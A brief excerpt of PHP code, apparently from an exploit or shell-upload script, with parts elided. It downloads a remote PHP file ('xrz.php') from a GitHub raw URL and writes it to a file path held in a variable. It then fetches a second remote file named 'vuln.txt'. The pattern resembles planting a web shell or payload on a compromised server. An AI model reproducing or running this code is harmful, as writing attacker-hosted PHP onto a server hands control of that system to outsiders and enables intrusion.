...
$text = http_get('https://raw.githubusercontent.com/FrezzGans/Frezz/master/xrz.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
...
$text2 = http_get('https://raw.githubusercontent.com/FrezzGans/Frezz/master/vuln.txt');
